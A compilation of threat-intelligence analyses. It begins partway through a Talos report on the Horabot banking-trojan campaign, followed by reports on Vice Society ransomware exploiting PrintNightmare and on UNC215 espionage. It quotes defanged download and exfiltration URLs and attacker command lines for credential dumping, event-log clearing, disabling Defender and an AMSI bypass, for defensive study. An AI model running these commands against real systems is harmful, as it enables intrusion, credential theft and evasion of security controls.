script_upyqta2_J.exeAutoIt interpreter_upyqta2_J.iaEncrypted trojan DLL_upyqta2_J.mdatEncrypted Spam tool DLL_upyqta2_Ji7.exeKinit.exe, a legitimate executablejli.dllBanking trojan MSVCR100.dllLegitimate DLLWebView2Loader.dllLegitimate DLLMalicious shortcut files detonate the payloads after system restartAfter the PowerShell downloader reboots the victim’s machine, the malicious Windows shortcut files dropped in the Windows startup folder are run, executing the payloads used in the attack.
This section describes the behavior of each of the shortcut files._upyqta2_JAA.lnkThis link file “_upyqta2_JAA.lnk” will sideload a malicious DLL called “jli.dll,” a banking trojan, by executing “_upyqta2_Ji7.exe,” which is actually a legitimate copy of “kinit.exe” that the PowerShell downloader script drops._upyqta2_JEX.lnkThis link file executes the compiled AutoIt
script “_upyqta2_J.ai” by running the executable “ _upyqta2_J.exe”, which is a legitimate AutoIt interpreter.
The AutoIt script decrypts the encrypted “_upyqta2_J.ia” and drops the DLL “_upyqta2_J.ia.a1” with a spoofed file extension that has a hardcoded malicious function “A040822_1”.
Then, the AutoIt script will sideload the DLL “_upyqta2_J.ia.a1” to the AutoIt interpreter process and execute the malicious function “A040822_1” with the parameter “STRUCT.”
The decrypted malicious DLL “_upyqta2_J.ia.a1” is another copy of the banking trojan with additional stealer capabilities such as keylogging, copying of clipboard data, screenshot capturing and mouse tracking.
A snippet of the AutoIt code _Upyqta2_J.ai_upyqta2_JAT.lnkThis link file performs the same steps as “_upyqta2_JEX.lnk” by executing the AutoIt script “_upyqta2_J.at” to decrypt “ _upyqta2_J.mdat” and create the DLL “_upyqta2_J.mdat.a1” with a spoofed extension.
Then, the AutoIt script sideloads the DLL to the AutoIt interpreter process and executes the malicious function “B080223_AT” with the parameter “STRUCT”.
The malicious DLL “_upyqta2_J.mdat.a1” is a spam tool with information-stealing capability.
A snippet of the AutoIt code _
Upyqta2_J.at_upyqta2_J.lnk
This link file executes one of the dropped batch files, “<desktop-name>S.cmd.”
The batch file executes an embedded PowerShell command to download the PowerShell downloader script from the attacker-controlled server using the URL hxxp[://]tributaria[.]website/esp/12/151222/up/up” and executes it.
The attacker uses the PowerShell downloader to reinfect the victim’s machine.
_
upyqta2_Jy.lnkThis
link file executes another dropped batch file, “<desktop_name>Sy.cmd”, which executes a PowerShell command to download and run the Horabot “au” using the URL hxxp[://]tributaria[.]website/esp/12/151222/au/au.
PayloadsTalos found that the payloads employed by the attacker in this campaign are designed to steal sensitive information, evade detection and disseminate additional phishing emails to the victim’s contacts.
The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.
The trojan also has anti-analysis and anti-detection capabilities to evade the sandbox and virtual environments.
The spam tool and newly identified Horabot are employed in the attack to compromise the victim’s mailboxes, steal their contact’s email addresses, and send phishing emails to the victim’s contacts.
Banking trojan targets victim’s login credentials and financial informationThe banking trojan identified in this campaign, a 32-bit Windows DLL written in the Delphi programming language and packed with Themida packer, can collect system information, credentials and user activity.
This trojan is based on a tool called Delphi_Remote_Access_PC, which is publicly available on GitHub.
It also uses similar techniques as Brazilian banking trojans reported by other security researchers at ESET and Check Point in the past.
The trojan performs surveillance on the victim’s machine by collecting system information such as hostnames, IPv4 address, operating system version, disk volume information, disk size and anti-virus software information, and gets the system’s default language.
The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request to the URL in the below format.hxxp[://]216[.]238[.]70[.]224/20/a/20/index[.]php?AT=<username>%20<hostname>%20<Operating system version>&MD=<Antivirus
software>
The trojan has remote desktop management capabilities such as creating and deleting directories on the victim’s machine, checking if a file on the victim’s filesystem exists and gets the file’s attributes, collecting size and version information, and downloading files from a URL.
It also has information-stealing capabilities, such as logging keystrokes via polling and application hooks, capturing screenshots, manipulating the victim’s machine clipboard and tracking the mouse's events.
It monitors the open application windows on the victim’s desktop, overlays fake windows, and manages the pop-up windows to steal sensitive information.
These pop-ups are stored in TFORMS in the RCData section of the executable.
The below screenshots show some of the forms configured to steal one-time security codes or soft tokens from the victim’s online banking web applications.
Banking trojan forms in the binary resource section. 
Talos spotted hardcoded SQL commands in the trojan binary designed to collect login data from the Google Chrome user profile folders by writing it to a database source file called “login_data.sql”, and creating SQL queries to produce the database tables to store the stolen data.
The dynamic analysis behavior in our analysis environment showed us that the database source file “login_data.sql” contains the login details and the associated URLs from the Google Chrome database files.
Database table containing the victim’s credentials. 
The trojan has several anti-analysis and anti-virtual machine (VM) techniques built-in to avoid analysis in automated sandboxes and to thwart debugging:
Detects the presence of debuggers through APIs IsDebuggerPresent, and OutputDebugStringW, and checks for system breakpoints.
Creates processes enabling the debug privileges by adjusting the process token “Debug,” readings the Process Environment Block, and queries the DebugPort to check if the malware is being debugged.
Checks for the existence of the anti-virus products such as AVG and Avast by checking for the DLLs avghookx.dll, avghooka.dll and snxhk.dll.
Detects the sandbox environments such as SunBelt and Joe sandboxes.
Checks the registry keys to detect virtual environments such as VMWare, Virtual Box, Wine, Microsoft Hyper-V or Windows Virtual PC.A spam tool acts as another payload in this campaign, enabling the attacker to take over the victim’s other email accounts and send spam emails to the contacts found within them.
The spam tool is a 32-bit DLL written in Delphi and, when run on the victim’s machine, will attempt to compromise the victim’s login credentials for webmail services such as Yahoo, Gmail, and Hotmail.
Upon compromising the credentials, the spam tool takes full control of the victim’s email account, creates spam messages and sends them to the email IDs found in the victim’s mailbox. 
The tool also exfiltrates the email address to the C2 server using an HTTP POST request.
The spam tool also showed us information-stealing capabilities such as logging keystrokes, capturing screenshots and tracking or intercepting the mouse events on the victim’s machine.
The decryption function decrypts the URL pointing to the attacker-controlled server.
New Horabot deployed to spread the infectionTalos discovered Horabot, an Outlook Phishing botnet program written in PowerShell.
It has embedded Visual Basic code that enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.
Phishing emails are themed as a tax receipt or service invoice and the attacker is using the email subject and body, in the format shown below:Phishing email subject:Se adjunta la factura del servicio <calendar month in Spanish> :ATT <dd/mm/yyy> <hh:mm:ss> <AM/PM>Comprobante Fiscal Digital <calendar month in Spanish> :ATT <dd/mm/yyy> <hh:mm:ss> <AM/PM>
Phishing email body: consulate los datos adjuntos, por favor.
<dd/mm/yyy> <hh:mm:ss> <AM/PM>The end game of the attacker is to deliver the banking trojan to steal the victim's creds and financial data, along with it they are delivering Horabot and separate spam tool to propagate the infection by sending the phishing emails to all of the validated email IDs in the victim's mailbox.
Attacker is using this technique to minimise the chances of their phishing infracture being tracked.
Horabot, during its initial phase of execution, initializes the victim’s desktop Outlook application by loading “Microsoft.
Office.
Interop.
Outlook” namespace to the PowerShell instance to create the Outlook application object for loading the MAPI namespace.
The script also initializes an array to store the stolen email addresses and creates a folder called “a160323” in “C:\Users\Public\.” as an infection marker.
A function that initializes the outlook application object. 
After initialization, the script looks for the Outlook data files from the victim profile’s Outlook application data folder.
It loads and accesses the victim’s address book and contacts if they exist.
It enumerates all folders and emails in the victim’s Outlook data file and extracts email addresses from the emails’ sender, recipients, CC and BCC fields.
During this process, the script checks the “AddressEntryUserType” object values to determine if the email address is one of the types listed below:Exchange agentExchange organizationExchange distribution listExchange public folderAddress that belongs to the same or different exchange forestAddress that uses Lightweight Directory Access Protocol
[LDAP]Address that uses Simple Mail Transfer Protocol
[SMTP]Function that enumerates and collects email addresses.
The script has an email address format validation function that compares all of the extracted email addresses with a regular expression.
After they are successfully validated, the addresses are added to the email address collection array.
A function that validates email address format. 
Next, the script writes the extracted email addresses from the array to a file called “.Outlook” created by the script in the roaming user profile’s
Microsoft application data folder.
Then the script encodes the email addresses in the “.Outlook” file to a data stream.
Using the GetRequestStream function, the script requests a data stream from the C2 server through the URL hxxp[://]139[.]177[.]193[.]74/esp/12/151222/au/tst/index[.]php?list and upon the successful response, the encoded email addresses are exfiltrated.
A function that exfiltrates email addresses.
After exfiltrating the email addresses, the script creates a folder “fb” in the Public user folder and creates an HTML file in it, named “adjuntos_1503.html” in our sample analysis.
Then the script downloads the contents of an HTML file stored in an attacker-controlled server and writes it to the HTML file dropped in the “fb” folder.
The HTML file has an embedded malicious URL “hxxps[://]facturacionmarzo[.]cloud/e/archivos[.]pdf[.]html” in its metadata section.
Next, the script constructs an email with a hardcoded subject and body and attaches the HTML file from the “fb” folder.
Then the phishing email is sent to the list of extracted email addresses one at a time, deleting the “fb” folder to cover its paths and avoid detection.
A function that sends phishing emails.
CoverageCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
Try Secure Endpoint for free here.
Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.
You can try Secure Email for free here.
Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.
Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
Sign up for a free trial of Umbrella here.
Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.
Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.
Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.
Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
Snort SIDs for this threat are 61839-61856 for Snort 2 and 300569-300577 for Snort 3.ClamAV detections are available for this threat:Txt.Loader.
Horabot-10003071-0Ps1.Downloader.
Horabot-10003078-0Win.
Trojan.
DelphiTrojanBanking-10003087-0Win.
DelphiTrojanBanking-10003088-0Txt.Malware.
Horabot-10003089-0Txt.Malware.
Horabot-10003090-0Txt.Malware.
Horabot-10003091-0Win.
Tool.
HorabotSpamTool-10003092-0IOCsIndicators of Compromise associated with this threat can be found here. 
title: Vice Society leverages PrintNightmare in ransomware attacks url: https://blog.talosintelligence.com/2021/08/vice-society-ransomware-printnightmare.html By Edmund Brumaghin, Joe Marshall, and Arnaud Zobec.
Executive SummaryAnother threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack, according to Cisco Talos Incident Response research.
While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society.
Talos Incident Response's research demonstrates that multiple, distinct threat actors view this vulnerability as attractive to use during their attacks and may indicate that this vulnerability will continue to see more widespread adoption and incorporation by various adversaries moving forward.
For defenders, it is important to understand the attack lifecycle leading up to the deployment of ransomware.
If users have not already, they should download the latest patch for PrintNightmare from Microsoft.
In this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice Society that leveraged this vulnerability.
Many of these same TTPs are commonly observed in other ransomware attacks, such as a previously published analysis of a WastedLocker attack.
Who is Vice Society?Vice Society is a relatively new player in the ransomware space.
They emerged in mid-2021 and have been observed launching big-game hunting and double-extortion attacks, primarily targeting small or midsize victims.
This group also has notably targeted public school districts and other educational institutions.
As they are a new actor in this space, Vice Society's TTPs are difficult to quantify.
However, based on incident response observations, they are quick to leverage new vulnerabilities for lateral movement and persistence on a victim's network.
They also attempt to be innovative on end-point detection response bypasses.
As with other threat actors operating in the big-game hunting space, Vice Society operates a data leak site, which they use to publish data exfiltrated from victims who do not choose to pay their extortion demands.
Below is an example screenshot of this site.
Recent attack methodologyThroughout the course of our analysis of a recent human-operated ransomware attack associated with Vice Society, we observed several notable tactics, techniques, and procedures (TTPs) used throughout each stage of the attack lifecycle.
Some of the most interesting characteristics of this attack were:The use of utilities such as proxychains and impacket during the post-compromise phases of the attack lifecycle.
The targeting of backups to prevent recovery following ransomware deployment.
The degradation of ESXi servers used for virtualization in victim environments.
The use of a DLL that takes advantage of the recently discovered PrintNightmare vulnerability for which Microsoft has previously released a security update.
Attempts to bypass native Windows protections for credential theft and privilege escalation.
Below are some key examples of the TTPs used in this attack as they relate to the Mitre ATT&CK Framework.
DiscoveryATT&CK Technique: System Owner/User Discovery (T1033)ATT&CK Technique: Account Discovery (T1087)ATT&CK Technique: Domain Trust Discovery (T1482)Once initial access was achieved, several techniques were observed being leveraged to conduct post-compromise discovery and reconnaissance within the environment.
We observed attempts to access the backup solution employed in the environment, likely to prevent the organization from successfully recovering without paying the demanded ransom.
The "sudo" command was used to obtain credentials associated with a commercial backup solution, likely trying to gain access to backups present within the environment.sudo -s
-k -p
[Backup Prompt] whoamiWe also observed the use of impacket, a common network protocol manipulation tool to enumerate the environment and obtain additional information about the Active Directory configuration in place.
This is typically done to identify high-value targets that may be attractive, as attacks attempt to maximize their sphere of influence over as much of the environment as possible prior, eventually deploying ransomware and making their presence known.
Below are some examples of the command line syntax used for the performance of this activity.cmd.exe /q
/c net group enterprise admins /domain
1> \\127.0.0.1\admin$\__[STIRNG] 2>&1cmd.exe /q
/c net group domain admins /domain
1> \\127.0.0.1\admin$\__[STRING] 2>&1 We observed enumeration of the domain trust relationships present within the environment.
The adversaries used the "nltest" command for this purpose.
c:\windows\system32\nltest.exe
/dclist
:
linux
[HOSTNAME]ExecutionATT&CK Technique: Command and Scripting Interpreter:
Windows Command Shell (T1059.003)ATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)ATT&CK Technique: Windows Management Instrumentation (T1047)ATT&CK Technique: System Services: Service Execution (T1569.002)Similar to what was observed during the post-compromise reconnaissance phase of the attack, the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.
The attacker also used the "proxychains" utility, which is often employed to redirect network traffic during penetration testing, red teaming, and other offensive operations.
cmd.exe /q
/c proxychains ~/impacket/examples/wmiexec.py -hashes [SHA256 HASH]
[USERNAME]@[IP ADDRESS] 1> \\127.0.0.1\admin$\__[STRING] 2>&1We also observed the adversary using Windows Batch files to execute PSExec.
In this case, PSExec remotely authenticated and executed PowerShell on remote systems within the environment.
cmd.exe /c
C:\s$\0.bat PsExec.exe -d \\[HOSTNAME] -u
[DOMAIN]\[USERNAME] -p
[PASSWORD] -accepteula -s
cmd /c
powershell.exe -ExecutionPolicy
Bypass -file \\[HOSTNAME]\s$\p.ps1
There were also artifacts in the environment that indicate that the recently disclosed PrintNightmare vulnerability may have been used during this attack.
A DLL associated with PrintNightmare was observed on systems within the environment as described in the section "Credential Access.
"PersistenceATT&CK Technique: Create or Modify System Process (T1543)In many big-game hunting ransomware attacks, upon achieving initial access into the target environment, the adversary will first attempt to achieve persistence so that they can regain access to the environment if they are detected or their initial point of access is otherwise removed.
In this particular case, we observed the adversary leveraging a Windows Service to execute PowerShell to stay persistent in the environment.
The Windows service was configured with the following options:Service Type: user mode service Service Start Type: demand start Service Account:
LocalSystem Service Name: Updater Service Filename: %COMSPEC% /C
start /b
%WINDIR%\System32\WindowsPowershell\v1.0\powershell -noP
-sta
-w 1 -enc
[BASE64 ENCODED BLOB]As can be seen above, the PowerShell being executed was Base64 encoded.
The decoded PowerShell instructions are below:This PowerShell is responsible for the performing the following tasks:Disabling PowerShell logging.
Bypassing AMSI protection for PowerShell.
Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server.
By implementing this persistence, the attacker can regain access to the environment if the targeted organization destroys their initial means of access.
Lateral movementATT&CK Technique: Remote Services (T1021)ATT&CK Technique: Lateral Tool Transfer (T1570)Once operational within the target environment, attackers will typically perform reconnaissance, identifying additional target systems, and then move laterally from system to system as they attempt to escalate privileges and then, ultimately, deploy ransomware on many systems in the environment.
During the investigation, we observed the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.
This was typically performed via the following command-line syntax:C:\Windows\system32\mstsc.exe /v
[HOSTNAME]The attacker also attempted to execute PowerShell scripts on remote systems in the environment while moving system-to-system.
Bypass -file \[IPADDRESS]\share$\p.ps1 During the attack, adversaries copied and executed the aforementioned PowerShell script on multiple systems across the environment.
Credential accessATT&CK
Technique: OS Credential Dumping (T1003)ATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001)The actor attempted to extract credentials from the victim in two ways: Accessing the active directory global catalog file ntds.dit and utilizing comsvcs.dll. Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data.
By invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process.
This is a classic and clever living-off-the-land binary (LoLBin) tactic that avoids popular credential extraction tools like Mimikatz, which may alert defenders.
We also observed attempts to dump the NTDS.dit, which is a database of Active Directory information.
Examples of the command-line syntax used in these cases are below.cmd.exe /q /c
powershell ntdsutil.exe '
ac i ntds' 'ifm' 'create full c:\temp' q q 1> \\127.0.0.1\admin$\__[STRING] 2>&1cmd.exe /q
/c powershell ntdsutil.exe '
ac i ntds' 'ifm' 'create full c:\temp_logs' q q 1> \\127.0.0.1\admin$\__[STRING]5 2>&1The actor also utilized PrintNightmare, a recently published series of vulnerabilities by Microsoft that would allow remote code execution when an improper print spooler performs privileged file operations.
This attack vector is notable in the ubiquitous nature of print services in all modern corporate enterprises.
Microsoft has recently released a security patch for PrintNightmare — we encourage all enterprises to patch immediately to avoid exploitation.
Defense evasionATT&CK Technique: Indicator Removal on Host: Clear Windows Event Logs (T1070.001)ATT&CK Technique: Modify Registry (T1112)ATT&CK Technique: Impair Defenses or Modify Tools (T1562.001)Throughout the attack, the adversary made multiple attempts to evade detection and subvert security controls in place as described throughout previous sections of this blog post.
We also observed the attacker attempting to clear the contents of security logs on compromised systems.
The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs.
c:\windows\system32\wevtutil.exe cl systemc:\windows\system32\wevtutil.exe cl securityc:\windows\system32\wevtutil.exe cl
applicationThe adversary was also observed remotely modifying the Windows Registry on remote systems to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities.
Disabling this security control allows attackers to leverage pass-the-hash attacks and hinder RDP's security on systems.cmd.exe /q /c
powershell new-itemproperty -path hklm:\system\currentcontrolset\control\lsa -name disablerestrictedadmin -value 0
-propertytype dword -force 1> \\127.0.0.1\admin$\__[STRING] 2>&1
We also observed the attacker disabling Windows Defender by modifying the Windows Registry on compromised systems.
This was performed using the following commands:C:\Windows\system32\reg.exe delete HKLM\Software\Policies\Microsoft\Windows Defender /fC:\Windows\system32\reg.exe add HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v
DisableRoutinelyTakingAction /t
REG_DWORD /d
1 /f C:\Windows\system32\reg.exe add HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v
DisableBlockAtFirstSeen /t
1 /f We also observed the threat actor attempting to evade detection while enumerating the environment using an AMSI bypass, which is often used as a way to evade detection by endpoint security solutions that may be present on compromised systems.
In this case, the Windows Command Processor was used to invoke PowerShell, which then leveraged Invoke-Expression (IEX) for this purpose.cmd.exe /Q /c powershell.exe -exec bypass -noni -nop
-w 1 -C IEX ([Net.ServicePointManager]::ServerCertificateValidationCallback={$true}try{[Ref].Assembly.
GetType('Sys'+'tem.
Man'+'agement.
Aut'+'omation.
Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed','NonP'+'ublic,Sta'+'tic').SetValue($null,$true)}catch{}quser) ExfiltrationATT&CK Technique: Exfiltration Over Alternative Protocol (T1048)Over the past couple of years, we have observed an increasing number of ransomware threat actors adopting a double-extortion methodology in their attacks.
In these attacks, adversaries attempt to exfiltrate large quantities of sensitive information for the purposes of further extortion against victims.
This data, once exfiltrated, is published to attacker-controlled websites that are commonly referred to as "data leak sites" in situations where the victim chooses not to pay the ransom demand.
In this attack, we observed the adversary attempting to exfiltrate sensitive information over SMB (TCP/445) directly from a compromised domain controller.
This was likely chosen as a way to bypass egress filtering that may have been in place at the perimeter of the victim environment.
Defender takeawaysIt can be difficult to account for the myriad ways an attacker can compromise and inflict malware on a network.
Given the techniques demonstrated here, it can feel overwhelming as a defender to account for every avenue of attack.
The good news is that there are several lessons we can learn about this incident: Logging is critical for forensics — ensure there is reliable and secure logging infrastructure in place.
Utilize multi-factor authentication to make credential theft more difficult to exploit.
Look at egress filtering for firewalls and ensure malicious traffic cannot call out to adversary infrastructure.
Utilize an endpoint detection response platform that detects LoLBin abuse and malware implants.
Keep up-to-date and offline backups that cannot be targeted by adversaries.
ConclusionAs demonstrated throughout this post, attackers often make use of a variety of tactics, techniques, and procedures as they work to accomplish their mission objectives.
In some instances, there is significant overlap and similarities between the approaches taken by distinct threat actors.
They often leverage dual-use tools for various purposes to minimize their footprint and evade detection.
Likewise, adversaries are constantly refining their approach to the ransomware attack lifecycle as they strive to operate more effectively, efficiently, and evasively.
The use of the vulnerability known as PrintNightmare shows that adversaries are paying close attention and will quickly incorporate new tools that they find useful for various purposes during their attacks.
Multiple distinct threat actors are now taking advantage of PrintNightmare, and this adoption will likely continue to increase as long as it is effective.
It is important that defenders be aware of the various TTPs being used throughout the attack lifecycle so that they are prepared to prevent, detect, and respond to nefarious activity that may be indicative of a successful compromise of their environment.
Failure to do so could result in widespread operational disruption, reputational damage, and the loss of confidentiality of sensitive information. 
CoverageWays our customers can detect and block this threat are listed below.
Cisco Secure Endpoint is ideally suited to prevent the execution of the malware detailed in this post.
New users can try Cisco Secure Endpoint for free here.
Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
Cisco Secure Firewall and Meraki MX can detect malicious activity associated with this threat.
Cisco Secure Malware Analytics helps identify malicious binaries and build protection into all Cisco Security products.
Cisco Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
Additional protections with context to your specific environment and threat data are available from the Cisco Secure Firewall Management Center.
Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
The following SIDs have been released to detect this threat: 57876, 57877.Indicators of Compromise (IOCs)The following IOCs have been observed being associated with the attack.
PrintNightmare DLL:
6f191f598589b7708b1890d56b374b45c6eb41610d34f976f0b4cfde8d5731af 
title: UNC215: Spotlight on a Chinese Espionage Campaign in Israel url: https://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 
This blog post details the post-compromise tradecraft and operational tactics, techniques, and procedures (TTPs) of a Chinese espionage group we track as UNC215.
While UNC215’s targets are located throughout the Middle East, Europe, Asia, and North America, this report focuses on intrusion activity primarily observed at Israeli entities. 
This report comes on the heels of the July 19, 2021, announcements by governments in North America, Europe, and Asia and intragovernmental organizations, such as the North Atlantic Treaty Organization (NATO), and the European Union, condemning widespread cyber espionage conducted on behalf of the Chinese Government.
These coordinated statements attributing sustained cyber espionage activities to the Chinese Government corroborate our long-standing reporting on Chinese threat actor targeting of private companies, governments, and various organizations around the world, and this blog post shows yet another region where Chinese cyber espionage is active. 
Threat Detail 
In early 2019, Mandiant began identifying and responding to intrusions in the Middle East by Chinese espionage group UNC215.
These intrusions exploited the Microsoft SharePoint vulnerability CVE-2019-0604 to install web shells and FOCUSFJORD payloads at targets in the Middle East and Central Asia.
There are targeting and high level technique overlaps with between UNC215 and APT27, but we do not have sufficient evidence to say that the same actor is responsible for both sets of activity.
APT27 has not been seen since 2015, and UNC215 is targeting many of the regions that APT27 previously focused on; however, we have not seen direct connection or shared tools, so we are only able to assess this link with low confidence. 
In addition to data from Mandiant Incident Response and FireEye telemetry, we worked with Israeli defense agencies to review data from additional compromises of Israeli entities.
This analysis showed multiple, concurrent operations against Israeli government institutions, IT providers and telecommunications entities beginning in January 2019.
During this time, UNC215 used new TTPs to hinder attribution and detection, maintain operational security, employ false flags, and leverage trusted relationships for lateral movement.
We believe this adversary is still active in the region. 
Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia. 
After gaining initial access, the operators conduct credential harvesting and extensive internal network reconnaissance.
This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.
The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems. 
In another incident response investigation, UNC215 pivoted to multiple OWA servers and installed web shells.
In the following days, the operators interacted with these web shells from internal IP addresses, attempting to harvest credentials. 
After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.
UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.
While UNC215 heavily relies on the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tools are developed and used exclusively by UNC215. Figure 1: Attack Lifecycle Tradecraft and Operational Security We identified numerous examples of efforts by UNC215 to foil network defenders by minimizing forensic evidence left on compromised hosts, exploiting relationships with trusted third parties, continuously improving the FOCUSFJORD backdoor, concealing command and control (C2) infrastructure, and incorporating false flags. 
Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.
This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise. 
The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.
The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.
On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the system’s registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.
This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.
A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.
The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence. 
Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.
As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target. 
Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.
The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.
We do not have enough context about the following samples to attribute all of them to UNC215, though they are representative of activity we have seen from the group. 
HYPERBRO samples MD5:
0ec4d0a477ba21bda9a96d8f360a6848 and MD5: 04dece2662f648f619d9c0377a7ba7c0 have embedded configurations of internal IP addresses (192.168.1.237 and 192.168.4.26 respectively) as C2 servers.
If they receive a command with an IP address and port, they will connect and relay the command. 
FOCUSFJORD sample MD5: e3e1b386cdc5f4bb2ba419eb69b1b921 has an internal IP address, 192.168.4.197, configured as its C2.
This sample was extracted from MD5: c25e8e4a2d5314ea55afd09845b3e886, which was submitted to a public malware repository in December 2017. 
While hunting for FOCUSFJORD samples, we found a sample of a new malware (MD5: 625dd9048e3289f19670896cf5bca7d8) that shares code with FOCUSFJORD, but is distinct.
However, analysis indicates that it only contains functions to relay communications between another FOCUSFJORD instance and a C2 server (Figure 2, Network A).
We suspect this type of malware was used in the aforementioned operation.
The actors stripped out unnecessary FOCUSFJORD capabilities, possibly to reduce the likelihood it would be detected by security controls.
Figure 3 contains the data structure as it is being sent from a FOCUSFJORD sample configured to communicate with another FOCUSFJORD victim. 
Figure 3: Two FOCUSFJORD samples configured to proxy C2 traffic FOCUSFJORD Changes We have observed numerous variants of the FOCUSFJORD malware family since 2017.
The authors have added new communications protocols, an updated loading mechanism, and expanded the number of supported configurations in newer versions.
Version numbers indicate that the malware undergoes frequent changes and maybe supported by a team of developers.
Many of these variants contain or remove functionality depending on the operator’s unique requirements at the time, which may suggest that multiple operators have access to the source code or a builder, or that a close relationship exists between the developers and operators. 
FOCUSFJORD samples can be configured with up to 13 unique registry values which allow operators to control and organize compromised hosts.
In addition to specifying details related to the loading and persistence mechanisms and C2 communications, there are two keys which allow the operator to add additional context about the victim: Registry key 12 is the “group” name.
When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to “default” and is later manually changed by the actor, usually to the victim’s domain name or organization name.
Registry key 13 could be interpreted as the “console” name, although we do not fully understand how the identifier is used by the operators.
We have observed the values “galway”, “iceland”, “helen”, and “idapro”. 
It is not clear how or if UNC215 uses these configuration parameters to organize and track large numbers of compromised hosts.
We observed different console values within the same network, identical console values using different C2 addresses, and identical console values targeting different countries.
Some FOCUSFJORD samples from 2018 and 2020 use the same console values despite the significant gap in time (See Table 1). 
The NCC Group discussed these configurations in a 2018 report and released a decoding tool. 
Trendmicro noted changes to supported configurations in FOCUSFJORD, dubbed SysUpdate, in their 2020 and 2021 reports following public disclosures.
This suggests that operators using FOCUSFJORD are sensitive to security vendor reports and will update the code to avoid detection and exposure. 
Registry Key 13 FOCUSFJORD MD5 Hash Related C2 Suspected Target helen 3d95e1c94bd528909308b198f3d47620 139.59.81.253 Israel helen 
f335b241652cb7f7e736202f14eb48e9 139.59.81.253 Israel helen a0b2193362152053671dbe5033771758 139.59.81.253 Israel helen 
6a9a4da3f7b2075984f79f67e4eb2f28 139.59.81.253 Kazakhstan helen a19370b97fe64ca6a0c202524af35a30 159.89.168.83 Iran helen 3c1981991cce3b329902288bb2354728 103.59.144.183 Unknown iceland 26d079e3afb08af0ac4c6d92fd221e71 178.79.177.69 UAE iceland 19c46d01685c463f21ef200e81cb1cf1 138.68.154.133 UAE iceland 28ce8dbdd2b7dfd123cebbfff263882c 138.68.154.133 Unknown iceland a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (Gov),
